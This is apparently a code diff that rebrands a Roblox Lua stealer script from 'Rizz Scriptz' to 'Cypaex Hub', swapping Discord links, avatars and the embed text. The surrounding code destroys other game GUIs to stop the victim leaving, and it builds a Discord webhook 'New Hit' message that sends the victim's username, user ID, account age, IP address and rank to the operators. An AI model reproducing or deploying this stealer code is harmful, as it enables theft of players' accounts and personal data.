@@ -120,7 +120,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "CypaexHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -1231,15 +1231,15 @@ end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+    imgs = "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
 
     data1 = {
         ["content"] = ping,
-        ["username"] = "Rizz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
+        ["username"] = "Cypaex Hub",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1129524257655902210/1130633198632718456/Cypaex.jpg",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||With Rizz||",
-            ["url"] = "https://discord.gg/uSgzNwHDTS",
+            ["title"] = "**New Hit** ||With Cypaex||",
+            ["url"] = "https://discord.gg/hzBAruhe2X",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
@@ -1248,7 +1248,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                ["name"] = "**This data was generated using Cypaex Hub's Stealer** :crescent_moon:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
